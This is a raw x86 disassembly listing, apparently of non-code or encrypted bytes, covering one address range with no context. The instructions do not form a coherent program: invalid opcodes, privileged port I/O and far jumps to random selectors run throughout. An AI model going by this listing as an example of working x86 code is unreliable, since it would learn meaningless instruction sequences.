  420542:	push   ebx
  420543:	dec    edx
  420544:	cdq    
  420545:	xchg   ebx,eax
  420546:	outs   dx,DWORD PTR ds:[esi]
  420547:	mov    cl,0x73
  420549:	(bad)  
  42054a:	outs   dx,DWORD PTR ds:[esi]
  42054b:	ret    
  42054c:	jmp    0x2268:0x27612523
  420553:	inc    ecx
  420554:	xchg   edi,eax
  420555:	shl    DWORD PTR [ebx-0xf],0xdc
  420559:	sub    eax,0x5faac3c0
  42055e:	sub    DWORD PTR [ecx],edi
  420560:	or     dh,BYTE PTR [esp+esi*1]
  420563:	lds    edx,FWORD PTR [edx]
  420565:	cmp    al,0x16
  420567:	inc    ebp
  420568:	out    dx,al
  420569:	outs   dx,DWORD PTR ds:[esi]
  42056a:	cwde   
  42056b:	pusha  
  42056c:	iret   
  42056d:	add    DWORD PTR [ebx],0x3d09902a
  420573:	fist   DWORD PTR [ebp+0x52]
  420576:	add    DWORD PTR gs:[ecx],eax
  420579:	adc    ebx,ebp
  42057b:	inc    esi
  42057c:	cmp    edi,edi
  42057e:	lods   al,BYTE PTR ds:[esi]
  42057f:	dec    ebx
  420580:	shl    BYTE PTR [bx+0x3214],cl
  420585:	int3   
  420586:	xor    bh,ah
  420588:	cs sbb eax,0x3b11b1e9
  42058e:	or     al,0x45
  420590:	cld    
  420591:	jmp    0x793:0x61319e7d
  420598:	cdq    
  420599:	mov    al,0x82
  42059b:	icebp  
  42059c:	stos   DWORD PTR es:[edi],eax
  42059d:	(bad)  
  42059e:	mov    edx,0x822f9aa9
  4205a3:	in     al,dx
  4205a4:	mov    ebp,0xd914f4bc
  4205a9:	jecxz  0x420536
  4205ab:	mov    ebp,0xb37b85c9
  4205b0:	adc    eax,0x8b4f740f
  4205b5:	daa    
  4205b6:	and    DWORD PTR [eax-0x5f056c20],0xca04b89
  4205c0:	out    dx,eax
  4205c1:	sbb    BYTE PTR [eax],bl
  4205c3:	dec    edi
  4205c4:	inc    esi
  4205c5:	inc    esi
  4205c6:	fsub   st(1),st
  4205c8:	pop    esp
  4205c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205ca:	dec    dx
  4205cc:	mov    edi,0x621bd86a
  4205d1:	push   cs
  4205d2:	cdq    
  4205d3:	push   ebp
  4205d4:	sub    eax,0x8e85cd37
  4205d9:	xor    DWORD PTR [edi],ebx
  4205db:	retf   
  4205dc:	dec    esi
  4205dd:	mov    ah,0xd3
  4205df:	push   ebp
  4205e0:	add    BYTE PTR [edx+0xde5aa82],ch
  4205e6:	loopne 0x42056a
  4205e8:	jg     0x4205c1
  4205ea:	mov    eax,ds:0x663412dd
  4205ef:	gs jbe 0x4205bc
  4205f2:	mov    ah,0x18
  4205f4:	push   eax
  4205f5:	lods   al,BYTE PTR ds:[esi]
  4205f6:	pop    ebx
  4205f7:	adc    edi,DWORD PTR [ebx-0x22884b9]
  4205fd:	cwde   
  4205fe:	stos   BYTE PTR es:[edi],al
  4205ff:	sbb    esp,DWORD PTR [ebx-0x4e82b438]
  420605:	push   ss
  420606:	inc    bp
  420608:	sub    ch,BYTE PTR [ebx-0x3f]
  42060b:	mov    dl,0x34
  42060d:	fbld   TBYTE PTR [edx-0x24]
  420610:	jne    0x420629
  420612:	inc    edx
  420613:	mov    ds:0x9665920c,al
  420618:	aad    0x20
  42061a:	mul    BYTE PTR [edi-0x6e849ef4]
  420620:	pop    edx
  420621:	add    esi,DWORD PTR ds:0x9cc8381
  420627:	ret    
  420628:	jmp    0x5585:0x58697068
  42062f:	jno    0x42067c
  420631:	adc    DWORD PTR [edx],esi
  420633:	jmp    0x420643
  420635:	push   ss
  420636:	xchg   ecx,eax
  420637:	jmp    0x420673
  420639:	mov    al,0x1d
  42063b:	xor    BYTE PTR [edx-0x25],0x38
  42063f:	and    ch,bh
  420641:	add    DWORD PTR [ebp+0x19],eax
  420644:	pop    ss
  420645:	jp     0x42064f
  420647:	(bad)  
  420648:	adc    eax,0x2332abce
  42064d:	jo     0x4205de
  42064f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420650:	mov    ch,cl
  420652:	fsubr  QWORD PTR [edx]
  420654:	(bad)  
  420655:	dec    ebx
  420656:	add    cl,BYTE PTR [ebp-0x69]
  420659:	test   al,0x7f
  42065b:	icebp  
  42065c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42065d:	stc    
  42065e:	xchg   ecx,eax
  42065f:	dec    esi
  420660:	or     eax,0xbaca1b36
  420665:	int3   
  420666:	mov    edx,?
  420668:	pusha  
  420669:	mov    ch,cl
  42066b:	mov    edi,0x399cc083
  420670:	add    edi,DWORD PTR [ebp-0x51bf7611]
  420676:	aas    
  420677:	dec    DWORD PTR [ebp-0x3c]
  42067a:	(bad)
  42067e:	fwait
  42067f:	mov    BYTE PTR [ecx-0x17],dl
  420682:	xor    eax,DWORD PTR [edx+ebp*8+0x414e9382]
  420689:	imul   esp,DWORD PTR [esi],0x7c
  42068c:	cmp    al,0x17
  42068e:	and    dh,bh
  420690:	mov    cl,0xbe
  420692:	adc    DWORD PTR [eax],ecx
  420694:	ret    
  420695:	cdq    
  420696:	ins    DWORD PTR es:[edi],dx
  420697:	in     eax,dx
  420698:	out    dx,eax
  420699:	mov    edi,esp
  42069b:	mov    BYTE PTR [edx+edx*4-0x4cc4c199],0xda
  4206a3:	pop    eax
  4206a4:	out    dx,eax
  4206a5:	jge    0x42063f
  4206a7:	test   eax,0xd73649bc
  4206ac:	sub    DWORD PTR [ebx-0x48],eax
  4206af:	je     0x4206f5
  4206b1:	push   ss
  4206b2:	adc    esp,0x51
  4206b5:	cwde   
  4206b6:	ds dec ebx
  4206b8:	out    dx,al
  4206b9:	xor    dl,al
  4206bb:	(bad)  
  4206bc:	xor    esi,DWORD PTR [esi+0x15fec75]
  4206c2:	xor    DWORD PTR [esi-0x30],0x5835ed1e
  4206c9:	sub    al,dh
  4206cb:	fidiv  WORD PTR [esp+esi*1]
  4206ce:	scas   al,BYTE PTR es:[edi]
  4206cf:	inc    edi
  4206d0:	and    edi,edi
  4206d2:	xchg   ebx,eax
  4206d3:	int3   
  4206d4:	pop    ds
  4206d5:	xchg   edi,eax
  4206d6:	ds cli 
  4206d8:	or     DWORD PTR [ecx-0x6b],ecx
  4206db:	jle    0x4206d3
  4206dd:	add    bh,ch
  4206df:	(bad)  
  4206e0:	outs   dx,DWORD PTR ds:[esi]
  4206e1:	dec    ecx
  4206e2:	mov    al,ds:0x2c86791b
  4206e7:	xchg   ecx,eax
  4206e8:	jbe    0x4206c3
  4206ea:	push   cs
  4206eb:	sahf   
  4206ec:	sti    
  4206ed:	jnp    0x420701
  4206ef:	mov    cl,0x2
  4206f1:	inc    ebp
  4206f2:	js     0x420694
  4206f4:	and    DWORD PTR [esi-0x24],esp
  4206f7:	nop
  4206f8:	and    BYTE PTR [eax+0x2d9a0150],dl
  4206fe:	retf   0xfed2
  420701:	xor    eax,0x475ff0ee
  420706:	mov    ds:0x59de4bc7,eax
  42070b:	xor    ebx,ecx
  42070d:	scas   eax,DWORD PTR es:[edi]
  42070e:	stos   DWORD PTR es:[edi],eax
  42070f:	jmp    0x5af2:0xcc6600e5
  420716:	and    DWORD PTR [eax+0x21],0x5a8bab3f
  42071d:	cmp    ah,BYTE PTR [ecx+0x58]
  420720:	xor    DWORD PTR [edi],ebp
  420722:	pushf  
  420723:	pop    ss
  420724:	mov    eax,0x2c6b497a
  420729:	lea    ebp,[ebx-0x52]
  42072c:	mov    al,0x75
  42072e:	mov    cl,0x40
  420730:	jle    0x4206f3
  420732:	in     al,0x7c
  420734:	shl    BYTE PTR ds:0x85b70aa5,1
  42073a:	sbb    ah,BYTE PTR [eax+0x46a61174]
  420740:	dec    edi
  420741:	ins    BYTE PTR es:[edi],dx
  420742:	inc    esi
  420743:	cmc    
  420744:	adc    cl,dh
  420746:	(bad)  
  420747:	jmp    0x420752
  420749:	dec    edi
  42074a:	adc    BYTE PTR [ecx],bl
  42074c:	retf   0x4ade
  42074f:	in     eax,0x8
  420751:	pop    edi
  420752:	sbb    al,0x9
  420754:	jg     0x42074c
  420756:	je     0x4206ef
  420758:	pop    es
  420759:	(bad)  
  42075a:	shr    BYTE PTR [eax],cl
  42075c:	inc    ebp
  42075d:	setp   BYTE PTR [eax]
  420760:	inc    eax
  420761:	cdq    
  420762:	inc    esp
  420763:	jp     0x4207b7
  420765:	cwde   
  420766:	xor    BYTE PTR [edx+0x622f1b59],0x61
  42076d:	fisttp WORD PTR [ecx]
  42076f:	mov    ch,0xf6
  420771:	icebp  
  420772:	scas   eax,DWORD PTR es:[edi]
  420773:	shl    DWORD PTR [edx+0x4c],0xfd
  420777:	adc    al,0x7d
  420779:	push   ebp
  42077a:	ins    DWORD PTR es:[edi],dx
  42077b:	call   0x1897:0x65dcd277
  420782:	mov    ds:0x3dd44450,al
  420787:	xor    BYTE PTR [edx],dl
  420789:	push   cs
  42078a:	out    dx,al
  42078b:	mov    cl,BYTE PTR [eax-0x468487ad]
  420791:	adc    DWORD PTR [eax+0x7feb39d],eax
  420797:	es pop es
  420799:	adc    eax,0xfd63a5da
  42079e:	sbb    eax,0x99ac2fa1
  4207a3:	inc    ecx
  4207a4:	fisub  DWORD PTR [esi-0x24]
  4207a7:	repnz push cs
  4207a9:	xor    ebx,DWORD PTR [edi]
  4207ab:	stos   DWORD PTR es:[edi],eax
  4207ac:	jge    0x4207e7
  4207ae:	mov    edx,0x11eab782
  4207b3:	imul   ebp,esp,0xc7f8ef43
  4207b9:	jne    0x420745
  4207bb:	stc    
  4207bc:	and    ebp,edx
  4207be:	enter  0xd6ab,0xbb
  4207c2:	cmp    al,0xdb
  4207c4:	jbe    0x420828
  4207c6:	xchg   ebp,eax
  4207c7:	ss cwde 
  4207c9:	test   eax,0x7cb49ed2
  4207ce:	xor    BYTE PTR [ecx-0x1c],ah
  4207d1:	aaa    
  4207d2:	loope  0x4207cd
  4207d4:	das    
  4207d5:	mov    edi,0x1d862cf0
  4207da:	cli    
  4207db:	cwde   
  4207dc:	popa   
  4207dd:	sar    DWORD PTR [edi],1
  4207df:	jge    0x4207fa
  4207e1:	inc    eax
  4207e2:	mov    al,ds:0xd07d6d82
  4207e7:	out    0x53,al
  4207e9:	dec    edx
  4207ea:	push   eax
  4207eb:	mov    edi,0x2169dd03
  4207f0:	fadd   QWORD PTR [ebx+ebx*8]
  4207f3:	mov    ah,ch
  4207f5:	data16 jp 0x420805
  4207f8:	push   cs
  4207f9:	lods   al,BYTE PTR ds:[esi]
  4207fa:	adc    dl,BYTE PTR [eax-0x24f6c630]
  420800:	push   edx
  420801:	(bad)  
  420802:	int    0x89
  420804:	call   DWORD PTR [ebp+esi*4-0x1e466059]
  42080b:	push   ecx
  42080c:	out    dx,eax
  42080d:	mov    BYTE PTR [edi-0x4869b538],al
  420813:	push   ecx
  420814:	xchg   esi,eax
  420815:	mov    esp,0x90ee456a
  42081a:	push   esp
  42081b:	ins    BYTE PTR es:[edi],dx
  42081c:	and    DWORD PTR [ebx-0x4e68c2a2],ebx
  420822:	lea    eax,es:[ebp+0x50a1b59a]
  420829:	inc    eax
  42082a:	xchg   esi,eax
  42082b:	xor    DWORD PTR [edi-0x3c],esi
  42082e:	or     BYTE PTR [eax-0x12],dl
  420831:	ret    0x545a
  420834:	add    DWORD PTR [ecx],ebp
  420836:	mov    esp,0x319c4e48
  42083b:	or     BYTE PTR cs:[ebx+0xc03df7b],bh
  420842:	cmp    dh,BYTE PTR [esi]
  420844:	add    dl,BYTE PTR [ebx]
  420846:	mov    WORD PTR [esi-0x7ef3d901],cs
  42084c:	jae    0x420835
  42084e:	xlat   BYTE PTR ds:[ebx]
  42084f:	jmp    0x30a9:0x2d56c818
  420856:	mov    ?,ebp
  420858:	pop    edi
  420859:	ds mov edx,0xdb02e136
  42085f:	adc    al,0x8c
  420861:	(bad)
  420864:	daa    
  420865:	and    dh,BYTE PTR [edi]
  420867:	dec    edi
  420868:	push   edx
  420869:	cmc    
  42086a:	dec    edx
  42086b:	xor    edx,eax
  42086d:	aad    0xe
  42086f:	adc    eax,0x760757c0
  420874:	push   eax
  420875:	scas   eax,DWORD PTR es:[edi]
  420876:	pop    ds
  420877:	sbb    ebp,DWORD PTR [edi]
  420879:	and    eax,0xe45b068e
  42087e:	push   eax
  42087f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420880:	out    0x1,eax
  420882:	(bad)  
  420883:	stc    
  420884:	jmp    edi
  420886:	mov    al,ds:0xb07c4e33
  42088b:	mov    WORD PTR [ebx],?
  42088d:	mov    edx,0xf32a249
  420892:	retf   
  420893:	mov    BYTE PTR [edx],ch
  420895:	stos   BYTE PTR es:[edi],al
  420896:	sbb    al,0x38
  420898:	je     0x4208f5
  42089a:	aam    0xf3
  42089c:	fisttp DWORD PTR [edx]
  42089e:	adc    BYTE PTR [esi],0xaf
  4208a1:	fadd   DWORD PTR [edi]
  4208a3:	sbb    eax,DWORD PTR [esi+ecx*1]
  4208a6:	aaa    
  4208a7:	mov    eax,ds:0xfbb80872
  4208ac:	xor    eax,0xea48e29f
  4208b1:	sbb    eax,0x83a5c20f
  4208b6:	add    dl,BYTE PTR ds:0xef6e7b2
  4208bc:	jp     0x42089b
  4208be:	cmp    dh,0x81
  4208c1:	cmp    edx,DWORD PTR [edx]
  4208c3:	mov    dl,0x96
  4208c5:	adc    al,0x40
  4208c7:	and    ecx,DWORD PTR [ecx+esi*4+0x5cbbae44]
  4208ce:	sub    DWORD PTR [esi-0x63],0x34
  4208d2:	dec    ebp
  4208d3:	jp     0x420925
  4208d5:	outs   dx,DWORD PTR ds:[esi]
  4208d6:	out    0x78,eax
  4208d8:	int    0xb7
  4208da:	rcr    dl,1
  4208dc:	out    0xb2,eax
  4208de:	xchg   edx,eax
  4208df:	cmp    DWORD PTR [ebx],edx
  4208e1:	xchg   edx,eax
  4208e2:	ss arpl bp,si
  4208e5:	outs   dx,BYTE PTR ds:[esi]
  4208e6:	push   ecx
  4208e7:	mov    ecx,0x1d6c6e44
  4208ec:	(bad)  
  4208ed:	adc    eax,0xc17f53ca
  4208f2:	sub    BYTE PTR [edi],ah
  4208f4:	daa    
  4208f5:	sub    DWORD PTR [edi+0x79],edi
  4208f8:	repnz cwde 
  4208fa:	jp     0x420975
  4208fc:	(bad)  
  4208fd:	xchg   edi,eax
  4208fe:	or     DWORD PTR [eax+0x24],esi
  420901:	pop    esp
  420902:	into   
  420903:	mov    BYTE PTR [edx],dl
  420905:	pop    ecx
  420906:	mov    esp,0x3d4b1de4
  42090b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090c:	inc    ecx
  42090d:	and    eax,0x8b170895
  420912:	jo     0x4208e2
  420914:	les    eax,FWORD PTR [edx+0x6]
  420917:	mov    dl,0xed
  420919:	fsub   QWORD PTR [esi+0x4d]
  42091c:	xchg   esi,eax
  42091d:	scas   al,BYTE PTR es:[edi]
  42091e:	loope  0x420977
  420920:	loope  0x420999
  420922:	daa    
  420923:	popf   
  420924:	icebp  
  420925:	inc    eax
  420926:	or     ecx,DWORD PTR [ebp+0xf]
  420929:	in     al,0x7
  42092b:	or     eax,0xc31a8a80
  420930:	data16 xlat BYTE PTR ds:[ebx]
  420932:	or     DWORD PTR [ebx-0x52],0x192c8d92
  420939:	bnd je 0x4209b2
  42093c:	sub    DWORD PTR [edi-0xa9311],esi
  420942:	ret    0x2922
  420945:	jg     0x4208f5
  420947:	sub    esi,DWORD PTR [esp+esi*2+0x7]
  42094b:	cwde   
  42094c:	xchg   DWORD PTR [edx-0x1da5ecec],esp
  420952:	and    eax,0x6051a5d3
  420957:	mov    es,WORD PTR [esi-0x5c]
  42095a:	lods   al,BYTE PTR ds:[esi]
  42095b:	popf   
  42095c:	push   ss
  42095d:	mov    bl,0x8f
  42095f:	sub    bl,BYTE PTR [esi-0x77]
  420962:	es out 0x1f,eax
  420965:	mov    al,ds:0x74141b12
  42096a:	lock dec esi
  42096c:	mov    ecx,0x3a420d63
  420971:	aad    0xc0
  420973:	push   edx
  420974:	inc    ecx
  420975:	test   eax,0xdece6130
  42097a:	jecxz  0x420969
  42097c:	dec    edi
  42097d:	jge    0x420959
  42097f:	(bad)  
  420981:	(bad)  
  420982:	jge    0x42092e
  420984:	lock pop eax
  420986:	or     DWORD PTR ds:0x675e72fa,esp
  42098c:	and    BYTE PTR [ecx],ch
  42098e:	mov    ebx,0x81d7b9bc
  420993:	push   es
  420994:	pop    ss
  420995:	xchg   ebx,eax
  420996:	test   BYTE PTR [edx+0x6c1309c5],al
  42099c:	inc    edx
  42099d:	pop    ds
  42099e:	stc    
  42099f:	inc    ecx
  4209a0:	push   ss
  4209a1:	test   al,0xf0
  4209a3:	and    al,BYTE PTR [esi+ebp*4+0x18]
  4209a7:	in     al,0x90
  4209a9:	into   
  4209aa:	mov    ds:0xec6da87c,eax
  4209af:	and    eax,0x1132b58e
  4209b4:	cmp    ebx,eax
  4209b6:	sbb    al,0x4
  4209b8:	cmp    eax,0x38499b18
  4209bd:	ja     0x420a3b
  4209bf:	dec    eax
  4209c0:	(bad)  
  4209c1:	dec    ebp
  4209c2:	xlat   BYTE PTR ds:[ebx]
  4209c3:	dec    DWORD PTR [edx]
  4209c5:	jmp    0x84fc:0xc5d07b0b
  4209cc:	inc    edx
  4209cd:	(bad)  
  4209ce:	enter  0xbb14,0x31
  4209d2:	mov    bl,0x9e
  4209d4:	cwde   
  4209d5:	scas   eax,DWORD PTR es:[edi]
  4209d6:	push   ebp
  4209d7:	lahf   
  4209d8:	js     0x420963
  4209da:	jnp    0x420a3e
  4209dc:	cwde   
  4209dd:	cs stos BYTE PTR es:[edi],al
  4209df:	push   esi
  4209e0:	test   BYTE PTR [ebp-0x77575045],0x19
  4209e7:	int    0xbc
  4209e9:	wrmsr  
  4209eb:	pop    ss
  4209ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ed:	lock stc 
  4209ef:	outs   dx,DWORD PTR ds:[esi]
  4209f0:	jo     0x420a11
  4209f2:	mov    ch,0x89
  4209f4:	pushf  
  4209f5:	inc    esp
  4209f6:	dec    ebp
  4209f7:	jge    0x4209be
  4209f9:	add    al,0xc
  4209fb:	in     eax,0x2f
  4209fd:	pop    ecx
  4209fe:	xor    dh,BYTE PTR [esp+ebp*4+0x4a]
  420a02:	out    0xa3,eax
  420a04:	rcr    BYTE PTR [edi+0x4f751da4],1
  420a0a:	aas    
  420a0b:	outs   dx,BYTE PTR ds:[esi]
  420a0c:	mov    ebx,0x792112b5
  420a11:	int    0xba
  420a13:	shl    cl,0x6b
  420a16:	dec    edi
  420a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a18:	xchg   ebx,eax
  420a19:	sbb    BYTE PTR [ebp+0x1be038d9],cl
  420a1f:	pushf  
  420a20:	cs pop edx
  420a22:	dec    edi
  420a23:	call   0xb6dc7e3c
  420a28:	iret   
  420a29:	ss mov ch,bl
  420a2c:	jle    0x4209be
  420a2e:	jmp    0x9f788aad
  420a33:	aad    0x82
  420a35:	inc    esi
  420a36:	mov    al,ds:0x58846379
  420a3b:	rol    DWORD PTR [eax-0x5621068],cl
  420a41:	mov    esi,0x6bdb4459
  420a46:	jb     0x420a84
  420a48:	xor    al,0x91
  420a4a:	xrelease xchg BYTE PTR [esi-0x18],bh
  420a4e:	pop    ebx
  420a4f:	sbb    DWORD PTR [esi+0x449cf28c],edx
  420a55:	mov    BYTE PTR [ebp+0x6d],dl
  420a58:	retf   
  420a59:	mov    DWORD PTR [ebx],eax
  420a5b:	jge    0x420abd
  420a5d:	sbb    al,0x75
  420a5f:	daa    
  420a60:	out    dx,al
  420a61:	jge    0x420a85
  420a63:	das    
  420a64:	sub    dl,BYTE PTR [esi+0x78]
  420a67:	add    DWORD PTR [ebx-0x13c863cb],eax
  420a6d:	retf   0xe3e3
  420a70:	adc    bl,BYTE PTR [esi+0x74f401ae]
  420a76:	cmp    DWORD PTR [esi-0x7],ebp
  420a79:	mov    cl,0xdb
  420a7b:	add    BYTE PTR [ebp-0x2d],bh
  420a7e:	mov    dh,0x9
  420a80:	mov    ah,0x38
  420a82:	push   ebx
  420a83:	sbb    dl,0xd0
  420a86:	lea    esi,[eax-0x2b]
  420a89:	jle    0x420a9a
  420a8b:	bound  ebx,QWORD PTR [ebx-0x6e]
  420a8e:	add    BYTE PTR [edx+0x5d10be21],ch
  420a94:	dec    esp
  420a95:	adc    eax,0x6d84df11
  420a9a:	jecxz  0x420a7a
  420a9c:	xchg   esp,eax
  420a9d:	push   edx
  420a9e:	sbb    DWORD PTR [ebx+0x0],eax
  420aa1:	icebp  
  420aa2:	sbb    bh,BYTE PTR [ebx]
  420aa4:	sub    al,0xff
  420aa6:	push   esi
  420aa7:	out    0x39,eax
  420aa9:	inc    edx
  420aaa:	in     eax,dx
  420aab:	adc    BYTE PTR [esi+0x1a7dc4ff],bh
  420ab1:	mov    edx,0x9e90aa44
  420ab6:	push   ecx
  420ab7:	push   0xffffff9b
  420ab9:	jge    0x420ab2
  420abb:	imul   ebp,DWORD PTR [ebx],0x34
  420abe:	bound  ebx,QWORD PTR ds:0xe7c7c4f6
  420ac4:	cmp    eax,0x2d6e3aac
  420ac9:	adc    DWORD PTR [ecx+0x4f],esp
  420acc:	sub    DWORD PTR [ecx+0x49b2713b],esp
  420ad2:	sub    edx,esp
  420ad4:	mov    ds:0xba278245,al
  420ad9:	add    DWORD PTR [edi],esi
  420adb:	pop    ebp
  420adc:	cmp    eax,0x8ea3d12e
  420ae1:	push   esp
  420ae2:	lods   al,BYTE PTR ds:[esi]
  420ae3:	lahf   
  420ae4:	mov    dl,0x65
  420ae6:	push   esi
  420ae7:	push   esi
  420ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae9:	inc    edx
  420aea:	jg     0x420b2f
  420aec:	lods   al,BYTE PTR ds:[esi]
  420aed:	stos   BYTE PTR es:[edi],al
  420aee:	xchg   ecx,eax
  420aef:	adc    DWORD PTR [eax-0x59280da9],eax
  420af5:	(bad)  
  420af6:	adc    BYTE PTR [ebx+0x6c],ch
  420af9:	mov    ebp,0xc81abbcb
  420afe:	dec    edi
  420aff:	clc    
  420b00:	sbb    DWORD PTR [eax],esi
  420b02:	arpl   WORD PTR [ebp+0x11],sp
  420b05:	sbb    DWORD PTR [ebx],ebx
  420b07:	fld    QWORD PTR [ebp-0x694f637c]
  420b0d:	jge    0x420ae7
  420b0f:	dec    edi
  420b10:	repz pop ss
  420b12:	mov    edi,0x361f39c4
  420b17:	lds    ebp,FWORD PTR ds:0xba7fb761
  420b1d:	into   
  420b1e:	cwde   
  420b1f:	iret   
  420b20:	fucom  st(1)
  420b22:	push   edx
  420b23:	call   0x8a03:0xb7d73a1a
  420b2a:	sbb    dh,ch
  420b2c:	cmp    BYTE PTR [esi+0x49],bl
  420b2f:	aad    0xd
  420b31:	fstp   st(2)
  420b33:	inc    esp
  420b34:	mov    bh,0x62
  420b36:	ret    0x9fe6
  420b39:	cmp    edi,ebx
  420b3b:	imul   edi,DWORD PTR [eax],0x30
  420b3e:	sbb    esi,DWORD PTR [esi-0x5c]
  420b41:	sub    dl,ah
  420b43:	mov    dh,0xa9
  420b45:	test   BYTE PTR [ebx-0x59],cl
  420b48:	inc    ebp
  420b49:	sub    eax,0x19c627bb
  420b4e:	xchg   ah,ch
  420b50:	cmp    al,0x75
  420b52:	(bad)  
  420b53:	aaa    
  420b54:	inc    esi
  420b55:	hlt    
  420b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b57:	mov    ch,0x4
  420b59:	inc    eax
  420b5a:	jmp    0x420b6b
  420b5c:	(bad)  
  420b5d:	fnsave [edi]
  420b5f:	cmc    
  420b60:	ficomp DWORD PTR [ecx]
  420b62:	mov    cs,eax
  420b64:	test   eax,0x81157697
  420b69:	mov    eax,0xf4b17ab4
  420b6e:	les    ebx,FWORD PTR [ecx-0x59]
  420b71:	or     al,0xcc
  420b73:	retf   
  420b74:	lahf   
  420b75:	add    dh,cl
  420b77:	xor    edx,DWORD PTR [edx-0x59]
  420b7a:	stos   BYTE PTR es:[edi],al
  420b7b:	mov    ah,0x7f
  420b7d:	sub    bl,dh
  420b7f:	or     ah,BYTE PTR [edx-0x37aee7c2]
  420b85:	hlt    
  420b86:	cmp    eax,0x1ca96e4d
  420b8b:	cld    
  420b8c:	adc    eax,0xba07dcfb
  420b91:	imul   ebx,DWORD PTR [eax+0x39b69dbb],0xdfc58ac4
  420b9b:	in     eax,dx
  420b9c:	mov    eax,ds:0xe6fdc61a
  420ba1:	sbb    BYTE PTR [edi+0x457f819c],0xd6
  420ba8:	and    DWORD PTR [ebx+ebx*8],0xffffffa6
  420bac:	in     al,dx
  420bad:	inc    ebx
  420bae:	hlt    
  420baf:	or     BYTE PTR [edx-0x4dad9213],ch
  420bb5:	jmp    0x420b8a
  420bb7:	sbb    DWORD PTR [esi],0xb6815767
  420bbd:	or     eax,0x870d82c8
  420bc2:	scas   al,BYTE PTR es:[edi]
  420bc3:	or     DWORD PTR [esi-0x7dd831ea],ebp
  420bc9:	mov    ecx,0x6facf4eb
  420bce:	add    al,0x7a
  420bd0:	call   0xfd1d:0x237912bf
  420bd7:	sub    dl,BYTE PTR [ebx-0x57]
  420bda:	and    eax,0x10d58ae4
  420bdf:	mov    ebx,0xcc60db95
  420be4:	ss sbb eax,0xde356f9b
  420bea:	cmp    al,0x69
  420bec:	mov    dl,0x41
  420bee:	push   cs
  420bef:	stos   BYTE PTR es:[edi],al
  420bf0:	or     ebp,ebx
  420bf2:	mov    bh,0xf3
  420bf4:	push   ebp
  420bf5:	inc    esp
  420bf6:	icebp  
  420bf7:	shl    BYTE PTR [edi+0x3b],cl
  420bfa:	sbb    DWORD PTR [esi],eax
  420bfc:	lods   eax,DWORD PTR ds:[esi]
  420bfd:	test   eax,esi
  420bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c00:	es push eax
  420c02:	sub    dl,BYTE PTR [ebx+eax*8-0x742ffaaf]
  420c09:	jmp    0x2f4fd868
  420c0e:	inc    esp
  420c0f:	sbb    al,0x48
  420c11:	mov    ebx,0x329e5876
  420c16:	shl    DWORD PTR [ebx],cl
  420c18:	inc    esp
  420c19:	shl    BYTE PTR fs:[edi-0x33],1
  420c1d:	or     bl,BYTE PTR ds:0x7e8cec52
  420c23:	mov    ch,0x79
  420c25:	cli    
  420c26:	imul   ecx,DWORD PTR [edi+0x5],0xffffffee
  420c2a:	fs add bh,ah
  420c2d:	jp     0x420c97
  420c2f:	xchg   edx,eax
  420c30:	push   cs
  420c31:	sub    eax,0x1d08a7ec
  420c36:	std    
  420c37:	retf   0x196a
  420c3a:	mul    cl
  420c3c:	in     eax,dx
  420c3d:	adc    DWORD PTR [ebx-0x16],edi
  420c40:	ins    BYTE PTR es:[edi],dx
  420c41:	push   es
  420c42:	xlat   BYTE PTR ds:[ebx]
  420c43:	xchg   esi,eax
  420c44:	mul    DWORD PTR [edi-0x66]
  420c47:	jnp    0x420c19
  420c49:	call   0xdb69:0x971b4d8
  420c50:	call   0x5998:0x5a1fc6f
  420c57:	cmp    esi,DWORD PTR [edx]
  420c59:	jne    0x420be8
  420c5b:	iret   
  420c5c:	add    DWORD PTR [edi+0x25c560c],ebp
  420c62:	fwait
  420c63:	xchg   BYTE PTR [ebp-0x35],dl
  420c66:	mov    al,0xfe
  420c68:	ja     0x420c4e
  420c6a:	push   edx
  420c6b:	sbb    BYTE PTR [eax+eiz*1+0xf],ch
  420c6f:	and    ah,ah
  420c71:	shr    DWORD PTR [eax-0x110344e4],cl
  420c77:	inc    ebp
  420c78:	jmp    0x5563:0xbee1ffe5
  420c7f:	out    dx,al
  420c80:	fs js  0x420c05
  420c83:	sbb    dl,BYTE PTR [esi+0x18]
  420c86:	dec    esp
  420c87:	add    eax,0xd3eaf800
  420c8c:	xchg   esi,eax
  420c8d:	in     al,dx
  420c8e:	mov    esi,0x29d857c6
  420c93:	(bad)  
  420c95:	jns    0x420cb3
  420c97:	inc    esi
  420c98:	repz mov ebx,0x9d5c5026
  420c9e:	push   ebp
  420c9f:	pop    ecx
  420ca0:	lock pop esp
  420ca2:	push   esi
  420ca3:	jle    0x420c54
  420ca5:	scas   eax,DWORD PTR es:[edi]
  420ca6:	xchg   ebx,eax
  420ca7:	(bad)  
  420ca8:	stc    
  420ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420caa:	xchg   ecx,eax
  420cab:	lods   al,BYTE PTR ds:[esi]
  420cac:	nop
  420cad:	pusha  
  420cae:	pop    ecx
  420caf:	sub    eax,0xc30b4d47
  420cb4:	mov    eax,ds:0xa6fe3d9d
  420cb9:	mov    edx,0xb334e32e
  420cbe:	add    al,0x8e
  420cc0:	sbb    esp,ebx
  420cc2:	mov    edi,0x3ee13b07
  420cc7:	add    eax,0x24111aa
  420ccc:	and    eax,0x6511275c
  420cd1:	push   eax
  420cd2:	lods   al,BYTE PTR ds:[esi]
  420cd3:	xchg   BYTE PTR [ebp+0x5],bl
  420cd6:	push   0x8c10a75c
  420cdb:	out    dx,al
  420cdc:	inc    ecx
  420cdd:	pop    esi
  420cde:	enter  0xe81c,0xdd
  420ce2:	sti    
  420ce3:	dec    eax
  420ce4:	fwait
  420ce5:	push   ebx
  420ce6:	mov    esi,0xdb71396d
  420ceb:	loope  0x420d20
  420ced:	jl     0x420cde
  420cef:	pop    esp
  420cf0:	mov    esi,0x119eae86
  420cf5:	bound  eax,QWORD PTR [edi-0x64a56c39]
  420cfb:	sbb    edi,DWORD PTR [esi+0x752fd23c]
  420d01:	fmul   st,st(5)
  420d03:	mov    ah,0x4e
